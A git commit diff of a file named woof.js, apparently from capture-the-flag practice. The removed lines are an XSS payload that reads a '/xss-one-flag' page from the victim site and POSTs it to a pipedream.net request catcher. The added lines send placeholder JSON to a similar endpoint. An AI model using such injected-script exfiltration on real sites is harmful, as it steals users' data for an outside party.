9f000a3c6c2eff1379467d65d12ddf6be5320047
Devesh Singh <devesh26830@gmail.com>
2024-05-06 00:30:05 +0530

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,13 +1,35 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "/xss-one-flag", true);
-xhr.onreadystatechange = function () {
-  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-    var flag = xhr.responseText;
-
-    fetch("https://enaxmztslcqvv.x.pipedream.net/", {
-      method: "POST",
-      body: flag,
-    });
-  }
+// Create the data to be sent in the POST request
+const postData = {
+  key1: "value1",
+  key2: "value2",
 };
-xhr.send();
+
+// Create the request options
+const requestOptions = {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify(postData),
+};
+
+// Make a POST request to the server
+fetch("https://en00910il7ax8xp.x.pipedream.net/", requestOptions)
+  .then((response) => {
+    // Check if the response is successful (status code 200)
+    if (response.ok) {
+      // Parse the response JSON data
+      return response.json();
+    } else {
+      // If the response is not successful, throw an error
+      throw new Error("Failed to fetch data");
+    }
+  })
+  .then((data) => {
+    // Handle the response data here
+    console.log(data);
+  })
+  .catch((error) => {
+    // Handle any errors that occur during the fetch request
+    console.error("Fetch error:", error);
+  });
